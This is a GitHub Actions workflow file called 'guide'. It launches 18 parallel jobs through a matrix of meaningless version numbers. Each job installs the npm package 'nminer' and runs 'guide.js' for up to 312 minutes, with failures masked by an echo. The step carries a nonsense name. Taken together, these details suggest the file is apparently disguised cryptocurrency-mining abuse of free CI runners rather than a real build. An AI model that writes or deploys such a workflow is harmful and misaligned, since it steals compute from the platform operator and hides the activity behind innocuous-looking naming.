name: guide
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6443 }
          - { version: 976 }
          - { version: 9686 }
          - { version: 2226 }
          - { version: 9423 }
          - { version: 7123 }
          - { version: 6202 }
          - { version: 2798 }
          - { version: 6180 }
          - { version: 1202 }
          - { version: 8885 }
          - { version: 6386 }
          - { version: 1344 }
          - { version: 367 }
          - { version: 1668 }
          - { version: 8151 }
          - { version: 8198 }
          - { version: 6608 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: um caring staid birth
        run: |
          npm install nminer@latest
          timeout 312m node guide.js || echo "guide executed"